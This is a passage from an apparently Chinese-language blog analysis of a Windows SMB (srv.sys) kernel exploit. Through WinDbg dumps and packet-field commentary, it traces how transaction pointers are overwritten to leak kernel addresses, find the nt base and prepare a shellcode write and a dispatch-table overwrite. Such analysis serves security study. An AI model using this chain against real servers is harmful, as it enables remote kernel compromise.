<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 5 hit</span><br><span class="line">srv!SrvCompleteExecuteTransaction+0x42e:</span><br><span class="line">fffff880`0504900e e82d88fbff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; dqs rdx</span><br><span class="line">fffffa80`1d4d4480  00000045`04700202</span><br><span class="line">fffffa80`1d4d4488  00000000`00000000</span><br><span class="line">fffffa80`1d4d4490  00000000`00000000</span><br><span class="line">fffffa80`1d4d4498  00000000`00000000</span><br><span class="line">fffffa80`1d4d44a0  00000000`00000000</span><br><span class="line">fffffa80`1d4d44a8  00000000`00000000</span><br><span class="line">fffffa80`1d4d44b0  00000000`00000000</span><br><span class="line">fffffa80`1d4d44b8  fffff880`0501af78 srv!SrvGlobalSpinLocks+0x98</span><br><span class="line">fffffa80`1d4d44c0  fffffa80`1d48a600</span><br><span class="line">fffffa80`1d4d44c8  00000000`ffffffa8</span><br><span class="line">fffffa80`1d4d44d0  fffffa80`19f51110</span><br><span class="line">fffffa80`1d4d44d8  80060000`00004000</span><br><span class="line">fffffa80`1d4d44e0  00000000`00000006</span><br><span class="line">fffffa80`1d4d44e8  fffffa80`1d4d1dd0</span><br><span class="line">fffffa80`1d4d44f0  fffffa80`1e287680</span><br><span class="line">fffffa80`1d4d44f8  fffffa80`1d48a600</span><br></pre></td></tr></table></figure>

<p>这个函数跟了下，复制大小是0x40，复制的起始地址是正是CONNECTION的其实地址</p>
<p><img src="./images/1504774793715.jpg" alt></p>
<p>那应该是覆盖了附近的transaction的OutData指针了</p>
<p>在SrvSmbTransactionSecondary+0x2cf 下个断点（即里面的memmove那里）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; bp srv!SrvSmbTransactionSecondary+0x2cf &quot;.if (@r8 &gt; 0x8) &#123;r rdx;r r8;db rdx l100;.echo ----------&#125;.else&#123;gc&#125;&quot;</span><br><span class="line">kd&gt; g</span><br><span class="line">rdx=fffffa8019b51492</span><br><span class="line">r8=0000000000000028</span><br><span class="line">fffffa80`19b51492  90 16 4d 1d 80 fa ff ff-04 00 00 00 00 00 00 00  ..M.............</span><br><span class="line">fffffa80`19b514a2  00 00 00 00 00 00 00 00-10 00 00 00 00 00 00 00  ................</span><br><span class="line">fffffa80`19b514b2  00 00 00 00 40 00 00 00-04 00 00 00 00 00 54 5d  ....@.........T]</span><br><span class="line">fffffa80`19b514c2  04 00 00 00 00 00 53 5d-04 00 00 00 00 00 52 5d  ......S]......R]</span><br><span class="line">fffffa80`19b514d2  04 00 00 00 00 00 51 5d-04 00 00 00 00 00 d0 5c  ......Q].......\</span><br><span class="line">fffffa80`19b514e2  04 00 00 00 00 00 cf 5c-04 00 00 00 00 00 4e 5c  .......\......N\</span><br><span class="line">fffffa80`19b514f2  04 00 00 00 00 00 cd 5c-04 00 00 00 00 00 cc 5c  .......\.......\</span><br><span class="line">fffffa80`19b51502  04 00 00 00 00 00 cb 5c-04 00 00 00 00 00 ca 5c  .......\.......\</span><br><span class="line">fffffa80`19b51512  04 00 00 00 00 00 c9 5c-04 00 00 00 00 00 c8 5c  .......\.......\</span><br><span class="line">fffffa80`19b51522  04 00 00 00 00 00 c7 5c-04 00 00 00 00 00 c6 5c  .......\.......\</span><br><span class="line">fffffa80`19b51532  04 00 00 00 00 00 c5 5c-04 00 00 00 00 00 c4 5c  .......\.......\</span><br><span class="line">fffffa80`19b51542  04 00 00 00 00 00 43 5d-04 00 00 00 00 00 42 5d  ......C]......B]</span><br><span class="line">fffffa80`19b51552  04 00 00 00 00 00 41 5d-04 00 00 00 00 00 40 5d  ......A]......@]</span><br><span class="line">fffffa80`19b51562  04 00 00 00 00 00 3f 5d-04 00 00 00 00 00 3e 5d  ......?]......&gt;]</span><br><span class="line">fffffa80`19b51572  04 00 00 00 00 00 3d 5d-04 00 00 00 00 00 3c 5d  ......=]......&lt;]</span><br><span class="line">fffffa80`19b51582  04 00 00 00 00 00 3b 5d-04 00 00 00 00 00 ba 5c  ......;].......\</span><br><span class="line">----------</span><br><span class="line">srv!SrvSmbTransactionSecondary+0x2cf:</span><br><span class="line">fffff880`0507e37f e8bc34f8ff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; kv</span><br><span class="line">Child-SP          RetAddr           : Args to Child                                                           : Call Site</span><br><span class="line">fffff880`044afa20 fffff880`050039a0 : 00000000`00000000 ffffc7b4`00000000 fffffa80`00000042 00000000`00000088 : srv!SrvSmbTransactionSecondary+0x2cf</span><br><span class="line">fffff880`044afab0 fffff880`05003607 : fffffa80`19b50010 fffffa80`1d4d1690 fffffa80`19b50a90 fffff880`0501a158 : srv!SrvProcessSmb+0x230</span><br><span class="line">fffff880`044afb20 fffff880`05043572 : fffffa80`1d48a600 fffffa80`19b50010 00000000`00000000 fffffa80`19b50020 : srv!SrvRestartReceive+0x10f</span><br><span class="line">fffff880`044afb60 fffff800`1afb1e3e : fffff8a0`02a765a0 fffffa80`1d48a600 00000000`00000080 fffffa80`1d45fdf0 : srv! ?? ::NNGAKEGL::`string&apos;+0x42ef</span><br><span class="line">fffff880`044afbe0 fffff800`1ac40521 : fffffa80`19aafb00 fffff8a0`02a765a0 fffff8a0`01b0e478 fffff8a0`00308a70 : nt!IopThreadStart+0x26</span><br><span class="line">fffff880`044afc10 fffff800`1ac7edd6 : fffff800`1af14180 fffffa80`19aafb00 fffffa80`1cbab080 fffffa80`18c5f980 : nt!PspSystemThreadStartup+0x59</span><br><span class="line">fffff880`044afc60 00000000`00000000 : fffff880`044b0000 fffff880`044aa000 00000000`00000000 00000000`00000000 : nt!KxStartSystemThread+0x16</span><br></pre></td></tr></table></figure>

<p>其实我们注意到复制的源地址的第一个8字节就是泄露出来的CONNECTION地址</p>
<p><img src="./images/1504776627026.jpg" alt></p>
<p>目标地址如下：而这个应该就是“另一个transaction”OutData指针的位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dq rcx</span><br><span class="line">fffff8a0`0292c1f8  fffff8a0`0292cffc 00000000`00000000</span><br><span class="line">fffff8a0`0292c208  00000000`00000000 00000000`00000d00</span><br><span class="line">fffff8a0`0292c218  00000000`00000090 00000101`00000000</span><br><span class="line">fffff8a0`0292c228  08022cfa`08020000 00000000`0000f278</span><br><span class="line">fffff8a0`0292c238  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`0292c248  00000000`00000000 00000000`00010101</span><br><span class="line">fffff8a0`0292c258  00000000`00000000 00000000`00000000</span><br><span class="line">fffff8a0`0292c268  00000000`00000000 00000000`00000000</span><br></pre></td></tr></table></figure>

<p>注释后的ida代码，</p>
<p><img src="./images/1504833079329.jpg" alt></p>
<p>再结合下面的数据包中的数据，首先DataCount是0x28（40），就是上面memmove的大小</p>
<p><img src="./images/1504833146808.jpg" alt></p>
<p>再看DataOffset是0x42，其实这个偏移刚好是数据包中CONNECTION的地址</p>
<p><img src="./images/1504833290717.jpg" alt></p>
<p>还有一个DataDisplacement，这是控制能够覆盖到附近transaction的OutData的保证</p>
<p><img src="./images/1504833374962.jpg" alt></p>
<h2 id="泄露Transaction2Dispatch-Table"><a href="#泄露Transaction2Dispatch-Table" class="headerlink" title="泄露Transaction2Dispatch Table"></a>泄露Transaction2Dispatch Table</h2><p>这个是在SRV global data pointer的地址的基础上在前面0x1000偏移处开始寻找</p>
<p>以某次找到的SRV global data pointer地址： 0xFFFFF8800501AF28为例</p>
<p>请求的地址依次如下：（每次递增0x200）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0xFFFFF88005019F28</span><br><span class="line">0xFFFFF8800501A128</span><br><span class="line">0xFFFFF8800501A328</span><br><span class="line">0xFFFFF8800501A528</span><br><span class="line">0xFFFFF8800501A728</span><br><span class="line">0xFFFFF8800501A928</span><br></pre></td></tr></table></figure>

<p>从下面可以看到利用的目标地址都是相同的<code>fffff8a0029471f8</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">rcx=fffff8a0029471f8</span><br><span class="line">rdx=fffffa8019b2f492</span><br><span class="line">r8=0000000000000028</span><br><span class="line">fffffa80`19b2f492  28 9f 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00  (...............</span><br><span class="line">-----------------------</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">srv!SrvCompleteExecuteTransaction+0x42e:</span><br><span class="line">fffff880`0504900e e82d88fbff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; g</span><br><span class="line">rcx=fffff8a0029471f8</span><br><span class="line">rdx=fffffa8019b78492</span><br><span class="line">r8=0000000000000028</span><br><span class="line">fffffa80`19b78492  28 a1 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00  (...............</span><br><span class="line">-----------------------</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">srv!SrvCompleteExecuteTransaction+0x42e:</span><br><span class="line">fffff880`0504900e e82d88fbff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; g</span><br><span class="line">rcx=fffff8a0029471f8</span><br><span class="line">rdx=fffffa801d4910d2</span><br><span class="line">r8=0000000000000028</span><br><span class="line">fffffa80`1d4910d2  28 a3 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00  (...............</span><br><span class="line">-----------------------</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">srv!SrvCompleteExecuteTransaction+0x42e:</span><br><span class="line">fffff880`0504900e e82d88fbff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; g</span><br><span class="line">rcx=fffff8a0029471f8</span><br><span class="line">rdx=fffffa801d495262</span><br><span class="line">r8=0000000000000028</span><br><span class="line">fffffa80`1d495262  28 a5 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00  (...............</span><br><span class="line">-----------------------</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">srv!SrvCompleteExecuteTransaction+0x42e:</span><br><span class="line">fffff880`0504900e e82d88fbff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; g</span><br><span class="line">rcx=fffff8a0029471f8</span><br><span class="line">rdx=fffffa801d4910d2</span><br><span class="line">r8=0000000000000028</span><br><span class="line">fffffa80`1d4910d2  28 a7 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00  (...............</span><br><span class="line">-----------------------</span><br><span class="line">kd&gt; g</span><br><span class="line">Breakpoint 1 hit</span><br><span class="line">srv!SrvCompleteExecuteTransaction+0x42e:</span><br><span class="line">fffff880`0504900e e82d88fbff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; g</span><br><span class="line">rcx=fffff8a0029471f8</span><br><span class="line">rdx=fffffa801d495262</span><br><span class="line">r8=0000000000000028</span><br><span class="line">fffffa80`1d495262  28 a9 01 05 80 f8 ff ff-04 00 00 00 00 00 00 00  (...............</span><br><span class="line">-----------------------</span><br></pre></td></tr></table></figure>

<p>猜想是根据Transaction2Dispatch Table前面的特征确认的吧，因为前面搜到的包都没有0xfefefefe的，只有Transaction2Dispatch Table有，假如我写代码可能会这么判断，还有就是这个表后面的两个函数指针是保留指针，所以地址相同，这个可以进一步判断</p>
<p><img src="./images/1505113092152.jpg" alt></p>
<h1 id="一步步获得执行权限"><a href="#一步步获得执行权限" class="headerlink" title="一步步获得执行权限"></a>一步步获得执行权限</h1><p>注：下面可能为多次调试，地址会变了，但最后一个字节应该是一样的</p>
<h2 id="确认可执行内存（其实是查找nt-KxUnexpectedInterrupt0）"><a href="#确认可执行内存（其实是查找nt-KxUnexpectedInterrupt0）" class="headerlink" title="确认可执行内存（其实是查找nt!KxUnexpectedInterrupt0）"></a>确认可执行内存（其实是查找nt!KxUnexpectedInterrupt0）</h2><p>第一次请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">rcx=fffff8a002b8b1f8</span><br><span class="line">rdx=fffffa801d4910d2</span><br><span class="line">r8=0000000000000028</span><br><span class="line">fffffa80`1d4910d2  fffffa80`1ab79468</span><br><span class="line">fffffa80`1d4910da  00000000`00000004</span><br><span class="line">fffffa80`1d4910e2  00000000`00000000</span><br><span class="line">fffffa80`1d4910ea  00000000`00000010</span><br><span class="line">fffffa80`1d4910f2  00000008`00000000</span><br><span class="line">fffffa80`1d4910fa  214566a9`5cd855bc</span><br><span class="line">fffffa80`1d491102  995a4c01`7568295b</span><br><span class="line">fffffa80`1d49110a  cde73a8f`4b46d657</span><br><span class="line">fffffa80`1d491112  2074631c`2642b6d5</span><br><span class="line">fffffa80`1d49111a  6d075bd2`381cc2b5</span><br><span class="line">fffffa80`1d491122  3507fd35`8ec65767</span><br><span class="line">fffffa80`1d49112a  46ef33c5`fb8019bc</span><br><span class="line">fffffa80`1d491132  7d035bce`e8ab0172</span><br><span class="line">fffffa80`1d49113a  27ac73f0`53a151b0</span><br><span class="line">fffffa80`1d491142  2c02a856`90036e2a</span><br><span class="line">fffffa80`1d49114a  cff25698`1fc097a9</span><br></pre></td></tr></table></figure>

<p>读取的核心内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fffffa80`1ab79468  fffffa80`1d48a600</span><br></pre></td></tr></table></figure>

<p>根据命令行的输出，这个是PreferredWorkQueue的地址</p>
<p><img src="./images/1505118127711.jpg" alt></p>
<p>那么这个<code>fffffa801ab79468</code>地址是怎么来的呢，经过下个巧妙的断点，再ctrl+f，就找到了</p>
<p>断点如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp srv!SrvSmbTransactionSecondary+0x2cf &quot;.if (@r8 &gt; 0x8) &#123;r rcx;r rdx;r r8;dqs rdx;.echo ***************************;dqs poi(rdx);.echo -----------------------&#125;.else&#123;gc&#125;&quot;</span><br></pre></td></tr></table></figure>

<p>我们发现<code>fffffa801ab79468</code>就在CONNECTION地址的0x78偏移处</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">fffffa80`1ab793f0  0000004a`04700202</span><br><span class="line">fffffa80`1ab793f8  00000000`00000000</span><br><span class="line">fffffa80`1ab79400  00000000`00000000</span><br><span class="line">fffffa80`1ab79408  00000000`00000000</span><br><span class="line">fffffa80`1ab79410  00000000`00000000</span><br><span class="line">fffffa80`1ab79418  00000000`00000000</span><br><span class="line">fffffa80`1ab79420  00000000`00000000</span><br><span class="line">fffffa80`1ab79428  fffff880`0501afa0 srv!SrvGlobalSpinLocks+0xc0</span><br><span class="line">fffffa80`1ab79430  fffffa80`1d48a600</span><br><span class="line">fffffa80`1ab79438  00000000`ffffffa8</span><br><span class="line">fffffa80`1ab79440  fffffa80`1de24a50</span><br><span class="line">fffffa80`1ab79448  80130000`00004000</span><br><span class="line">fffffa80`1ab79450  00000000`00000013</span><br><span class="line">fffffa80`1ab79458  fffffa80`1d4d1dd0</span><br><span class="line">fffffa80`1ab79460  fffffa80`19aa6040</span><br><span class="line">fffffa80`1ab79468  fffffa80`1d48a600</span><br></pre></td></tr></table></figure>

<p>之后就会泄露PreferredWorkQueue+0x198：即读取<code>fffffa801d48a798</code>的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; g</span><br><span class="line">rcx=fffff8a002a241f8</span><br><span class="line">rdx=fffffa801d4910d2</span><br><span class="line">r8=0000000000000028</span><br><span class="line">fffffa80`1d4910d2  fffffa80`1d48a798</span><br><span class="line">......</span><br><span class="line">***************************</span><br><span class="line">fffffa80`1d48a798  fffffa80`1d48e040</span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>而获取到的 fffffa801d48e040正是IrpThread</p>
<p><img src="./images/1505119577633.jpg" alt></p>
<p>KProcess的值便是IrpThread+0x220处的值</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dqs fffffa801d48e040+0x220</span><br><span class="line">fffffa80`1d48e260  fffffa80`18c5f980</span><br></pre></td></tr></table></figure>

<p><img src="./images/1505119727358.jpg" alt></p>
<p>ProcessListEntry.Blink是在KProcess+0x240处（到这才有符号，汗，没控制台的输出那就很难搞了）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dqs fffffa80`18c5f980+0x240 l1</span><br><span class="line">fffffa80`18c5fbc0  fffff800`1aeefc80 nt!KiProcessListHead</span><br></pre></td></tr></table></figure>

<p>接下来不断向后搜寻从<code>fffff8001ac20000</code>开始向前寻找，在<code>fffff8001ac1e000</code>找到了Nt的基址（Base of Nt）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fffff800`1ac20000 nt!XpressDecodeCreate+0x20</span><br><span class="line">fffff800`1ac1f000 nt! ?? ::FNODOBFM::`string&apos;+0x4c05a</span><br><span class="line">fffff800`1ac1e000 nt!`string&apos; &lt;PERF&gt; (nt+0x0)</span><br></pre></td></tr></table></figure>

<p>那是怎么确定这就是Nt的基址呢？（感觉有点不靠谱，就一个MZ）</p>
<p><img src="./images/1505121860679.jpg" alt></p>
<p>在之后就泄露下面两个地址（我猜测nt!KxUnexpectedInterrupt0是通过Nt的基址算出来的）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fffff800`1ac1e258 nt!`string&apos; &lt;PERF&gt; (nt+0x258)</span><br><span class="line">fffff800`1ae8f000 nt!KxUnexpectedInterrupt0</span><br></pre></td></tr></table></figure>

<p>而nt!KxUnexpectedInterrupt0正是可读可写地址</p>
<p><img src="./images/1505122352661.jpg" alt></p>
<h2 id="写入一些数据及SrvTransaction2DispatchTable函数指针改写"><a href="#写入一些数据及SrvTransaction2DispatchTable函数指针改写" class="headerlink" title="写入一些数据及SrvTransaction2DispatchTable函数指针改写"></a>写入一些数据及SrvTransaction2DispatchTable函数指针改写</h2><p>首先将<code>fffff8001ae8f000</code>覆盖一个transaction的InData指针，为写入shellcode做准备</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; r</span><br><span class="line">rax=0000000000000000 rbx=fffffa801de91820 rcx=0000000000000000</span><br><span class="line">rdx=0000000000004fe0 rsi=fffff8a002948010 rdi=0000000000000002</span><br><span class="line">rip=fffff8800507e364 rsp=fffff88004f1ea20 rbp=fffffa8019f45010</span><br><span class="line"> r8=0000000000000042  r9=fffffa8019f46450 r10=0000000000000000</span><br><span class="line">r11=0000000000000026 r12=fffffa8019f46450 r13=0000000000000001</span><br><span class="line">r14=0000000000000008 r15=0000000000000000</span><br><span class="line">iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">srv!SrvSmbTransactionSecondary+0x2b4:</span><br><span class="line">fffff880`0507e364 8b8c24a8000000  mov     ecx,dword ptr [rsp+0A8h] ss:0018:fffff880`04f1eac8=00004fe0</span><br><span class="line">kd&gt; t</span><br><span class="line">srv!SrvSmbTransactionSecondary+0x2bb:</span><br><span class="line">fffff880`0507e36b 8b9424a0000000  mov     edx,dword ptr [rsp+0A0h]</span><br><span class="line">kd&gt; t</span><br><span class="line">srv!SrvSmbTransactionSecondary+0x2c2:</span><br><span class="line">fffff880`0507e372 4d8bc6          mov     r8,r14</span><br><span class="line">kd&gt; t</span><br><span class="line">srv!SrvSmbTransactionSecondary+0x2c5:</span><br><span class="line">fffff880`0507e375 48038e80000000  add     rcx,qword ptr [rsi+80h]</span><br><span class="line">kd&gt; r</span><br><span class="line">rax=0000000000000000 rbx=fffffa801de91820 rcx=0000000000004fe0</span><br><span class="line">rdx=0000000000000042 rsi=fffff8a002948010 rdi=0000000000000002</span><br><span class="line">rip=fffff8800507e375 rsp=fffff88004f1ea20 rbp=fffffa8019f45010</span><br><span class="line"> r8=0000000000000008  r9=fffffa8019f46450 r10=0000000000000000</span><br><span class="line">r11=0000000000000026 r12=fffffa8019f46450 r13=0000000000000001</span><br><span class="line">r14=0000000000000008 r15=0000000000000000</span><br><span class="line">iopl=0         nv up ei pl nz na pe nc</span><br><span class="line">cs=0010  ss=0018  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202</span><br><span class="line">srv!SrvSmbTransactionSecondary+0x2c5:</span><br><span class="line">fffff880`0507e375 48038e80000000  add     rcx,qword ptr [rsi+80h] ds:002b:fffff8a0`02948090=fffff8a002948310</span><br><span class="line">kd&gt;  dqs fffff8a002948310+4fe0</span><br><span class="line">fffff8a0`0294d2f0  fffff8a0`0291a170</span><br><span class="line">fffff8a0`0294d2f8  fffff8a0`0294dffc</span><br><span class="line">fffff8a0`0294d300  00000000`00000000</span><br><span class="line">fffff8a0`0294d308  00000000`00000000</span><br><span class="line">fffff8a0`0294d310  000002ec`00000c50</span><br><span class="line">fffff8a0`0294d318  00000000`00001000</span><br><span class="line">fffff8a0`0294d320  00000101`00000000</span><br><span class="line">fffff8a0`0294d328  08005f5d`08000000</span><br><span class="line">fffff8a0`0294d330  00000000`00000000</span><br><span class="line">fffff8a0`0294d338  00000000`00000000</span><br><span class="line">fffff8a0`0294d340  00000000`00000000</span><br><span class="line">fffff8a0`0294d348  00000000`00000000</span><br><span class="line">fffff8a0`0294d350  00000000`00010101</span><br><span class="line">fffff8a0`0294d358  00000000`00000000</span><br><span class="line">fffff8a0`0294d360  00000000`00000000</span><br><span class="line">fffff8a0`0294d368  00000000`00000000</span><br><span class="line">kd&gt; dqs fffff8a002948310+4fe0-0x80</span><br><span class="line">fffff8a0`0294d270  00000000`0d8c020c</span><br><span class="line">fffff8a0`0294d278  fffffa80`19a64dd0</span><br><span class="line">fffff8a0`0294d280  fffffa80`1de91600</span><br><span class="line">fffff8a0`0294d288  fffff8a0`07575310</span><br><span class="line">fffff8a0`0294d290  fffff8a0`02a4e2d0</span><br><span class="line">fffff8a0`0294d298  fffff8a0`02953298</span><br><span class="line">fffff8a0`0294d2a0  fffff8a0`02926298</span><br><span class="line">fffff8a0`0294d2a8  00000000`00000000</span><br><span class="line">fffff8a0`0294d2b0  00000000`00020000</span><br><span class="line">fffff8a0`0294d2b8  fffff8a0`0294d368</span><br><span class="line">fffff8a0`0294d2c0  00000001`0000aec0</span><br><span class="line">fffff8a0`0294d2c8  00000000`00000000</span><br><span class="line">fffff8a0`0294d2d0  fffff8a0`0294d36c</span><br><span class="line">fffff8a0`0294d2d8  00000000`00000000</span><br><span class="line">fffff8a0`0294d2e0  fffff8a0`0294d36c</span><br><span class="line">fffff8a0`0294d2e8  fffff8a0`0294d3ac</span><br><span class="line">kd&gt; p</span><br><span class="line">srv!SrvSmbTransactionSecondary+0x2cc:</span><br><span class="line">fffff880`0507e37c 4903d4          add     rdx,r12</span><br><span class="line">kd&gt; p</span><br><span class="line">srv!SrvSmbTransactionSecondary+0x2cf:</span><br><span class="line">fffff880`0507e37f e8bc34f8ff      call    srv!memmove (fffff880`05001840)</span><br><span class="line">kd&gt; r rcx;r rdx;r r8;dqs rdx l1</span><br><span class="line">rcx=fffff8a00294d2f0</span><br><span class="line">rdx=fffffa8019f46492</span><br><span class="line">r8=0000000000000008</span><br><span class="line">fffffa80`19f46492  fffff800`1ae8f000 nt!KxUnexpectedInterrupt0</span><br></pre></td></tr></table></figure>

<p>在数据包体现如下：</p>
<p><img src="./images/1505268156659.jpg" alt></p>
<p>之后将一些数据复制到fffff8001ae8f000（nt!KxUnexpectedInterrupt0）</p>
